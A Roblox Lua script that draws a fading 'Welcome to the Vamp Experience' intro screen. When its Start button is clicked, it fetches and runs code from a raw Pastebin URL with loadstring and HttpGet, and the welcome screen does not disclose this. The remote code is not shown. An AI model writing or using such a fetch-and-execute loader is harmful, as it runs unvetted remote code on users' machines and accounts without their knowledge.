local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local uiCorner = Instance.new("UICorner")
local title = Instance.new("TextLabel")
local description = Instance.new("TextLabel")
local button = Instance.new("TextButton")
local buttonUiCorner = Instance.new("UICorner")

screenGui.Name = "IntroGui"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

frame.Size = UDim2.new(0.5, 0, 0.5, 0)
frame.Position = UDim2.new(0.25, 0, 0.25, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BackgroundTransparency = 1
frame.Parent = screenGui

uiCorner.CornerRadius = UDim.new(0.1, 0)
uiCorner.Parent = frame

title.Size = UDim2.new(1, 0, 0.2, 0)
title.Position = UDim2.new(0, 0, 0.1, 0)
title.BackgroundTransparency = 1
title.Text = "L0C0N"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GrenzeGotisch
title.TextTransparency = 1
title.Parent = frame

description.Size = UDim2.new(0.8, 0, 0.2, 0)
description.Position = UDim2.new(0.1, 0, 0.4, 0)
description.BackgroundTransparency = 1
description.Text = "Welcome to the Vamp Experience"
description.TextColor3 = Color3.fromRGB(200, 200, 200)
description.TextScaled = true
description.Font = Enum.Font.GrenzeGotisch
description.TextTransparency = 1
description.Parent = frame

button.Size = UDim2.new(0.6, 0, 0.2, 0)
button.Position = UDim2.new(0.2, 0, 0.7, 0)
button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
button.Text = "Start"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextScaled = true
button.Font = Enum.Font.GrenzeGotisch
button.TextTransparency = 1
button.Parent = frame

buttonUiCorner.CornerRadius = UDim.new(0.1, 0)
buttonUiCorner.Parent = button

button.MouseButton1Click:Connect(function()
    -- Fade out animation
    for i = 0, 1, 0.1 do
        frame.BackgroundTransparency = i
        title.TextTransparency = i
        description.TextTransparency = i
        button.TextTransparency = i
        wait(0.05)
    end
    screenGui:Destroy()
    loadstring(game:HttpGet("https://pastebin.com/raw/QiV0rQpA"))()
end)

for i = 1, 0, -0.1 do
    frame.BackgroundTransparency = i
    wait(0.05)
end

title:TweenPosition(UDim2.new(0, 0, 0.1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Bounce, 1, true)

for i = 1, 0, -0.1 do
    title.TextTransparency = i
    description.TextTransparency = i
    button.TextTransparency = i
    wait(0.05)
end
